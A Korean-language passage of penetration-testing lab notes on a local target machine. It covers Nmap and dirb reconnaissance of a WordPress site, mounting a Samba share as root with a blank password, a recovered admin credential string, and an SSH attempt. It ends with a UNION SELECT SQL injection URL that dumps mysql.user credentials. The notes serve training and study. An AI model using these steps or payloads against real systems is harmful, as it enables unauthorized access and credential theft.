## 3-1. 자료 조사
### Nmap
![[Pasted image 20240927152325.png]]
- 공격할 대상 서버의 IP가 56.109로 추측된다.
- 22(ssh), 80(http), 139, 445(samba) 서비스가 동작 중인 것으로 보인다.
### http
- `http://192.168.56.109/` 로 접속했지만 별 다른 소득은 없다.
![[Pasted image 20240927152819.png]]
- `dirb http://192.168.56.109/`로 접속 가능한 웹 서버 디렉터리를 조사한다.
- `http://192.168.56.109/phpinfo.php`![[Pasted image 20240927154227.png]]
- `http://192.168.56.109/wordpress/index.php`![[Pasted image 20240927154257.png]]
	- US:- +18436457766 (전화번호 인것 같다.)
	- 그 외에는 전부 테마의 기본 페이지 인 것 같다.
- `http://192.168.56.109/wordpress/xmlrpc.php`![[Pasted image 20240927154320.png]]XML-RPC server accepts POST requests only.
  [XML-RPC](https://ko.wikipedia.org/wiki/XML-RPC) 서버는 POST 요청만 허용합니다.
- `http://192.168.56.109/wordpress/wp-login.php`
- `http://192.168.56.109/wordpress/wp-content/plugins/redirection/`
### samb
- 분명 이 서버에 samb 도 함께 동작하고 있었다.
- samb 서비스를 활용해서 원격 접속할 수 있는 방법을 찾아보자
- [[Samba]]
- 공격자 서버에서 samba 클라이언트 설정을 하고 접속 시도![[Pasted image 20240927160513.png]]
- 패스워드가 뭘까 방금 찾은 전화번호?![[Pasted image 20240927160855.png]]
	공백을 입력하니 samba server에 접속할 수 있었다.
- `mount -t cifs //[Samba 서버 IP 주소]/[공유 Section 명] [mount할 디렉터리] -o username=[Samba 서버 접근 ID] -o password=[Samba 서버 접근 ID의 Password]`
```
mount -t cifs //192.168.56.109/websvr ./samb -o username=root -o password= 
```
![[Pasted image 20240927161524.png]]
![[Pasted image 20240927161627.png]]
- admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCk
- 아쉽게도 이 admin 암호는 암호화되어 있는 것 같다.![[Pasted image 20240927162100.png]]
- 암호화를 풀어보려 했지만 별 소득은 없었다.![[Pasted image 20240927162233.png]]
- 이걸로 ssh 로그인을 시도해볼까?

### searchsploit

### ssh
- `ssh admin@192.168.56.109`

```txt
http://192.168.56.109/kb/question.php?ID=1%20UNION%20SELECT%20concat(user,char(58),password)%20FROM%20mysql.user%20
```